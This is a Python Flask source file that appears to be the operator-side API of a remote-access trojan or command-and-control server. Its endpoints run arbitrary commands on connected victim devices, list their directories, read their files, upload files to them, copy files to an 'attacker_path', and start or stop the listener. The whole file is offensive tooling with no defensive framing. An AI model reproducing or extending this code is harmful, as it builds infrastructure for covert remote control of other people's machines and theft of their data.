from globals import *


def api_endpoints(Handler):
    api = Blueprint("api", __name__, url_prefix="/api")

    @api.route("/api/rce", methods=["POST"])
    def rce():
        id = request.form.get("id")
        cmd = request.form.get("cmd")
        status, output = Handler.rce(id, cmd)
        if status:
            return jsonify({"status": "success", "output": output}), 200
        else:
            return jsonify({"status": "error", "output": output}), 400

    @api.route("/api/infos", methods=["GET"])
    def infos():
        id = request.args.get("id")
        status, output = Handler.get_device_infos(id)
        if status:
            return jsonify({"status": "success", "output": output}), 200
        else:
            return jsonify({"status": "error", "output": output}), 400

    @api.route("/api/dir", methods=["GET"])
    def dir():
        id = request.args.get("id")
        dir = request.args.get("dir")
        status, output = Handler.get_directory_contents(id, dir)
        if status:
            return jsonify({"status": "success", "output": output}), 200
        else:
            return jsonify({"status": "error", "output": output}), 400

    @api.route("/api/file", methods=["GET"])
    def file():
        id = request.args.get("id")
        path = request.args.get("path")
        status, output = Handler.get_file_contents(id, path)
        if status:
            return jsonify({"status": "success", "output": output}), 200
        else:
            return jsonify({"status": "error", "output": output}), 400

    @api.route("/api/upload", methods=["POST"])
    def upload():
        id = request.form.get("id")
        fil = request.form.get("fil")
        path = request.form.get("path")
        status, output = Handler.file_upload(id, fil, path)
        if status:
            return jsonify({"status": "success", "output": output}), 200
        else:
            return jsonify({"status": "error", "output": output}), 400

    @api.route("/api/download", methods=["POST"])
    def download():
        id = request.form.get("id")
        target_path = request.form.get("target_path")
        attacker_path = request.form.get("attacker_path")
        status, output = Handler.file_download(id, target_path, attacker_path)
        if status:
            return jsonify({"status": "success", "output": output}), 200
        else:
            return jsonify({"status": "error", "output": output}), 400

    @api.route("/api/start", methods=["POST"])
    def start():
        address = request.form.get("address")
        port = request.form.get("port")
        try:
            Handler.start(address, port)
        except:
            return jsonify({"status": "error", "output": "Could not start server"}), 500
        else:
            return jsonify({"status": "success", "output": "Server started"}), 200

    @api.route("/api/stop", methods=["DELETE"])
    def stop():
        try:
            Handler.stop()
        except:
            return jsonify({"status": "error", "output": "Could not stop server"}), 500
        else:
            return jsonify({"status": "success", "output": "Server stopped"}), 200

    @api.route("/api/connections", methods=["GET"])
    def connections():
        return jsonify({"status": "success", "output": Handler.connections}), 200
    return api